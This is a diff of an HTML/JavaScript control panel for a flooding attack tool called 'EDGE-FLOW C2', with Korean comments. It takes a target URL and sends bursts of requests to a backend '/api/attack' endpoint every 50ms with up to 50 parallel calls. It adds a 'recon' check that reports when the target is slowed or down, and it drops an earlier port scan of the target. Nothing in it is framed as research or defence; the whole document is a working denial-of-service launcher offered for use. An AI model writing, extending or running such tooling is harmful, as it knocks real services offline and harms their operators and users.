@@ -2,136 +2,134 @@
 <html lang="ko">
 <head>
     <meta charset="UTF-8">
-    <title>☢️ EDGE-FLOW TOTAL ANNIHILATION</title>
+    <title>☢️ EDGE-FLOW v6.5 RECON-DESTROY</title>
     <style>
-        :root { --neon: #00ff41; --bg: #050505; --warn: #ff3e3e; --scan: #00d4ff; }
+        :root { --neon: #00ff41; --bg: #050505; --warn: #ff3e3e; --scan: #00d4ff; --recon: #f0f000; }
         body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; margin: 0; padding: 20px; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
         .header { border-bottom: 2px solid var(--neon); padding-bottom: 10px; margin-bottom: 20px; text-shadow: 0 0 10px var(--neon); display: flex; justify-content: space-between; align-items: center; }
         .controls { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; background: #111; padding: 20px; border: 1px solid #333; border-radius: 10px; }
         .full-width { grid-column: span 2; }
         label { display: block; margin-bottom: 5px; font-size: 0.8em; color: #888; }
         input, select { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 12px; width: 100%; box-sizing: border-box; font-size: 1.1em; outline: none; }
-        .btn-group { display: flex; gap: 10px; margin-top: 20px; }
-        button { flex: 1; padding: 15px; font-weight: bold; cursor: pointer; border: none; transition: 0.3s; font-size: 1.2em; text-transform: uppercase; }
-        #startBtn { background: var(--neon); color: #000; box-shadow: 0 0 15px rgba(0, 255, 65, 0.3); }
-        #stopBtn { background: var(--warn); color: #fff; opacity: 0.5; cursor: not-allowed; }
+        .btn-group { display: flex; gap: 10px; margin-top: 20px; flex-wrap: wrap; }
+        button { flex: 1; min-width: 140px; padding: 15px; font-weight: bold; cursor: pointer; border: none; transition: 0.2s; font-size: 1.1em; text-transform: uppercase; }
+        #startBtn { background: var(--neon); color: #000; }
+        #reconBtn { background: var(--recon); color: #000; }
+        #stopBtn { background: var(--warn); color: #fff; }
         #terminal { flex-grow: 1; background: #000; border: 1px solid #222; margin-top: 20px; padding: 15px; overflow-y: auto; font-size: 11px; border-radius: 5px; box-shadow: inset 0 0 15px #000; }
-        .log-entry { margin-bottom: 4px; border-left: 3px solid var(--neon); padding-left: 8px; }
+        .log-entry { margin-bottom: 4px; border-left: 3px solid var(--neon); padding-left: 8px; animation: flash 0.3s; }
         .log-err { color: var(--warn); border-left-color: var(--warn); }
         .log-scan { color: var(--scan); border-left-color: var(--scan); }
+        .log-recon { color: var(--recon); border-left-color: var(--recon); font-weight: bold; }
+        @keyframes flash { from { background: rgba(0,255,65,0.2); } to { background: transparent; } }
         .stats { font-size: 0.9em; color: #888; }
     </style>
 </head>
 <body>
     <div class="header">
-        <h1>[ EDGE-FLOW C2 v6.0 - NO LIMITS ]</h1>
+        <h1>[ EDGE-FLOW C2 v6.5 - RECON ]</h1>
         <div class="stats">
-            STATUS: <span id="statusText">READY</span> | 
-            PAYLOAD: <span id="shotCount">0</span>
+            STATUS: <span id="statusText">STANDBY</span> | 
+            LOAD: <span id="shotCount">0</span>
         </div>
     </div>
 
     <div class="controls">
         <div class="full-width">
-            <label>TARGET IP / URL (DESTRUCTION TARGET)</label>
+            <label>TARGET IP / URL</label>
             <input type="text" id="target" value="http://" placeholder="http://1.2.3.4">
         </div>
         <div>
-            <label>FIRE INTERVAL (ms)</label>
+            <label>FIRE RATE</label>
             <select id="rate">
-                <option value="50" selected>MAX OVERLOAD (50ms)</option>
-                <option value="100">TURBO (100ms)</option>
+                <option value="50" selected>OVERLOAD (50ms)</option>
+                <option value="200">STEALTH (200ms)</option>
             </select>
         </div>
         <div>
-            <label>THREAD MULTIPLIER</label>
+            <label>POWER THREADS</label>
             <select id="threads">
                 <option value="50" selected>GOD MODE (50x)</option>
-                <option value="20">HIGH (20x)</option>
+                <option value="10">LOW (10x)</option>
             </select>
         </div>
     </div>
 
     <div class="btn-group">
         <button id="startBtn" onclick="initiate()">MISSION START</button>
-        <button id="stopBtn" onclick="terminate()">EMERGENCY STOP</button>
+        <button id="reconBtn" onclick="checkTargetStatus()">CHECK TARGET</button>
+        <button id="stopBtn" onclick="terminate()">STOP</button>
     </div>
 
-    <div id="terminal">>> SYSTEM UNLOCKED. WAITING FOR TARGET INPUT...</div>
+    <div id="terminal">>> SYSTEM INITIALIZED. READY FOR COMMAND.</div>
 
     <script>
         let attackInterval = null;
         let totalShots = 0;
-        const commonPorts = [80, 443, 8080, 1900, 5000, 8888];
 
         function log(msg, type = 'info') {
             const term = document.getElementById('terminal');
             const div = document.createElement('div');
-            div.className = `log-entry ${type === 'error' ? 'log-err' : type === 'scan' ? 'log-scan' : ''}`;
+            div.className = `log-entry ${type === 'error' ? 'log-err' : type === 'scan' ? 'log-scan' : type === 'recon' ? 'log-recon' : ''}`;
             div.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
             term.prepend(div);
-            if (term.childNodes.length > 50) term.removeChild(term.lastChild);
+            if (term.childNodes.length > 60) term.removeChild(term.lastChild);
+        }
+
+        // [정찰 기능] 별도의 버튼으로 동작
+        async function checkTargetStatus() {
+            const target = document.getElementById('target').value.trim();
+            if (!target.startsWith('http')) { log("ENTER VALID TARGET FIRST", "error"); return; }
+            
+            log("📡 SENDING RECONNAISSANCE DRONE...", "recon");
+            const startTime = Date.now();
+
+            try {
+                const controller = new AbortController();
+                const timeout = setTimeout(() => controller.abort(), 4000); // 4초 후 타임아웃
+                
+                // 공격 패킷이 아닌 순수 상태 체크
+                await fetch(target, { mode: 'no-cors', cache: 'no-store', signal: controller.signal });
+                const latency = Date.now() - startTime;
+                
+                if (latency > 1500) {
+                    log(`⚠️ TARGET STRUGGLING! (Latency: ${latency}ms)`, "recon");
+                } else {
+                    log(`🟢 TARGET RESPONDING (Latency: ${latency}ms)`, "recon");
+                }
+                clearTimeout(timeout);
+            } catch (e) {
+                log("💀 TARGET UNRESPONSIVE! 격침 확인 완료.", "error");
+            }
         }
 
         async function initiate() {
             const target = document.getElementById('target').value.trim();
-            if (!target.startsWith('http')) { log("CRITICAL ERROR: INVALID TARGET", "error"); return; }
+            if (!target.startsWith('http')) { log("INVALID TARGET", "error"); return; }
 
-            toggleButtons(true);
-            log(`🔍 INITIATING RAPID RECONNAISSANCE ON ${target}...`, "scan");
-
-            let openPorts = [];
-            await Promise.all(commonPorts.map(async (port) => {
-                try {
-                    const controller = new AbortController();
-                    setTimeout(() => controller.abort(), 1200);
-                    await fetch(`${target}:${port}`, { mode: 'no-cors', signal: controller.signal });
-                    log(`[TARGET ACQUIRED] PORT ${port} IS OPEN`, "scan");
-                    openPorts.push(port);
-                } catch(e) {}
-            }));
-
-            if (openPorts.length === 0) {
-                log("NO SPECIFIC PORTS RESPONDING. FORCING DEFAULT HTTP.", "error");
-                openPorts.push(80);
-            }
-
-            beginBombardment(target, openPorts);
-        }
-
-        function beginBombardment(base, ports) {
-            const rate = parseInt(document.getElementById('rate').value);
-            const threads = parseInt(document.getElementById('threads').value);
-            
             document.getElementById('statusText').innerText = "ANNIHILATING";
             document.getElementById('statusText').style.color = "red";
-            log(`🔥 TOTAL WAR DECLARED. FIRING ON PORTS: ${ports.join(", ")}`);
+            log(`🚀 FIRE! TARGET LOCK-ON: ${target}`);
+
+            const rate = parseInt(document.getElementById('rate').value);
+            const threads = parseInt(document.getElementById('threads').value);
 
             attackInterval = setInterval(() => {
-                ports.forEach(port => {
-                    for(let i=0; i < threads; i++) {
-                        // v6.0 서버 엔진 호출 (무거운 POST 패킷 전송)
-                        fetch(`/api/attack?target=${encodeURIComponent(base + ":" + port)}&v=6&cb=${Math.random()}`)
-                            .then(() => {
-                                totalShots += 15000; // 서버 로직에 맞춰 카운트 보정
-                                document.getElementById('shotCount').innerText = totalShots.toLocaleString();
-                                log(`DIRECT HIT -> PORT ${port}`);
-                            }).catch(() => {});
-                    }
-                });
+                for(let i=0; i < threads; i++) {
+                    fetch(`/api/attack?target=${encodeURIComponent(target)}&cb=${Math.random()}`)
+                    .then(() => {
+                        totalShots += 15000;
+                        document.getElementById('shotCount').innerText = totalShots.toLocaleString();
+                    }).catch(() => {});
+                }
             }, rate);
-        }
-
-        function toggleButtons(running) {
-            document.getElementById('startBtn').disabled = running;
-            document.getElementById('startBtn').style.opacity = running ? "0.5" : "1";
-            document.getElementById('stopBtn').disabled = !running;
-            document.getElementById('stopBtn').style.opacity = running ? "1" : "0.5";
         }
 
         function terminate() {
             clearInterval(attackInterval);
-            location.reload(); 
+            document.getElementById('statusText').innerText = "STANDBY";
+            document.getElementById('statusText').style.color = "var(--neon)";
+            log("!!! MISSION STOPPED !!!", "error");
         }
     </script>
 </body>
